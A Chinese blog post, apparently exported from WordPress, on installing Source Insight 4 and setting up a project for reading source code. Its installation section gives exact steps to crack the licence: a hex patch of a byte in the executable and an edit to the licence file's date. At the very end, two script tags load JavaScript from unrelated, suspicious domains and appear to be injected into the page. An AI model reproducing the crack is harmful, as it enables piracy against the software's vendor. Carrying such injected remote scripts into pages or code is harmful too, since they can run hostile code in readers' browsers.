---
title: "\u5982\u4f55\u4f7f\u7528Source Insight4\u9605\u8bfb\u9879\u76ee\u6e90\u7801"
date: 2021-06-14 18:50:42
slug: "如何使用source-insight4阅读项目源码"
categories:
  - 计算机技术
tags:
  - Source Insight
  - 源码阅读
  - 计算机技术
description: >-
  Source Insight是一款非常流行的源码编辑器和浏览器，可以生成源码调用层级关系树、类继承图表等信息，极大地提升我们阅读源码的效率。
draft: false
---

<!-- wp:heading {"level":3} -->
<h3>目录</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>[TOC]  //wordpress的markdown渲染器不支持自动生成目录的吗...orz</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>一、简介</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>趁着最近比较空闲，想找些项目源码看看。虽然Visual Studio也提供跳转到定义、查找引用之类的功能，但每次创建项目都非常麻烦，而且阅读效率并不是特别高。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Source Insight是一款非常流行的源码编辑器和浏览器，可以生成源码调用层级关系树、类继承图表等信息，极大地提升我们阅读源码的效率。Source Insight自动为源码生成符号数据库，需要查找符号的时候可以直接从数据库中查找。俗话说“工欲善其事必先利其器”，在开始源码阅读之前，这款利器值得一试。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>二、安装</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>首先从官网下载Source Insight 4安装包：<br><a href="https://www.sourceinsight.com/updates/" target="_blank" rel="noreferrer noopener">https://www.sourceinsight.com/updates/</a><br>注意选择安装目录，按照一般软件安装流程安装好即可。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>初次运行时可以获得30天免费试用时间，购买Windows平台个人版价格是239美刀，建议有余力的老板支持下正版(ry</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><br>对于想把这款工具用作学习用途的同学，<del>破解的方法非常简单：</del></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>首先准备一款可以打开二进制文件的编辑器，这里用的编辑器是<code>HexEdit</code>，好处是比较轻便，连安装都省了。<br>下载链接：<a href="https://pan.baidu.com/s/17_xwnaladB9k1qh_b27cWA" target="_blank" rel="noreferrer noopener">https://pan.baidu.com/s/17_xwnaladB9k1qh_b27cWA</a><br>提取码：gumj</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>找到Source Insight的安装目录，Windows下默认的路径是<code>C:\Program Files (x86)\Source Insight 4.0</code>，<strong>以管理员身份运行</strong>HexEdit，打开<code>sourceinsight4.exe</code>。按<code>ctrl+f</code>调出搜索框，搜索十六进制字串<code>c800 0000 742a 83bc 2408</code>，取消选中Find text后点确定。将结果中的<code>74</code>改为<code>EB</code>，保存文件。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://i.loli.net/2021/06/14/IHkLQZMwsmTivGU.jpg" alt="在文件中查找字串"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>打开<code>C:\ProgramData\Source Insight\4.0</code>，用记事本打开里面的<code>si4.lic</code>，修改<code>Date</code>字段年份的值为2030后保存关闭。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://i.loli.net/2021/06/14/bejD5h792mkJRZH.jpg" alt="修改si4.lic"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>重新启动Source Insight，可以看到授权信息已经被修改。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://i.loli.net/2021/06/14/lOCP92ndDbMgcHi.jpg" alt="授权管理页"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>PS：本方法仅用于学习用途，请支持正版。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>三、使用方法</h3>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>1.创建项目</h4>
<!-- /wp:heading -->

<!-- wp:heading {"level":5} -->
<h5>第一步</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>运行安装好的软件，准备向Source Insight导入我们的第一个项目。<br>点击菜单栏<code>Project-->new project</code>，看到软件弹出新建项目的对话框。输入项目名称，为了保证源码目录不会掺杂别的文件，我为Source Insight项目专门建了一个目录<code>..\Projects\Source Insight</code>。点击OK按钮进入下一步。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://i.loli.net/2021/06/14/U6rVSu3A8z7g4oW.jpg" alt="new-project-1.jpg"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":5} -->
<h5>第二步</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>在Project Source Directory一栏为项目指定我们要阅读的源码目录，点击OK<br><img src="https://i.loli.net/2021/06/14/E2L35SiN8YnlMH6.jpg" alt="new-project-2.jpg"></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>第三步</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>点击右侧<code>Add Tree</code>按钮将目录下要浏览的的源码加入到项目，不需要的文件可以点击<code>Remove File</code>移除，也可以点击<code>Remove Special...</code>指定移除的文件夹。上方的<code>File Name</code>可以不管。点击<code>close</code>我们的项目就创建完毕了。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://i.loli.net/2021/06/14/ly9KkiTgHMUuhOR.jpg" alt="new-project-3.jpg"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>2.基本界面</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>项目成功导入后就可愉快地开始阅读了。左侧符号窗口列出当前文件中的变量、类、方法等符号。选中源码窗口中的符号时，上下文窗口将会显示该符号的声明，类似Visual Studio的peek功能。Rational Window根据函数的调用关系生成关系图，可以更直观地观察各个函数的层级关系。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>各个小窗口可以通过菜单栏的<code>View</code>进行设置，通过拖动将窗口调整到自己喜欢的位置。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://i.loli.net/2021/06/14/MzYCyLpkODmSQ2q.jpg" alt="main-window.jpg"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>三、小结</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>使用Source Insight可以提高源码阅读效率，还有很多高级功能有待探索，将来在使用中有更多的体会和经验将继续补充到这里。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>参考资料：</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>https://blog.csdn.net/qq_21792169/article/details/85835864<br>https://blog.csdn.net/qq_41960196/article/details/86636713<br>https://www.cnblogs.com/mengdd/p/3506526.html<br>https://www.cnblogs.com/andy-songwei/p/9965714.html<br>https://www.cnblogs.com/csonezp/archive/2012/10/06/2712910.html</p>
<!-- /wp:paragraph --><script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>
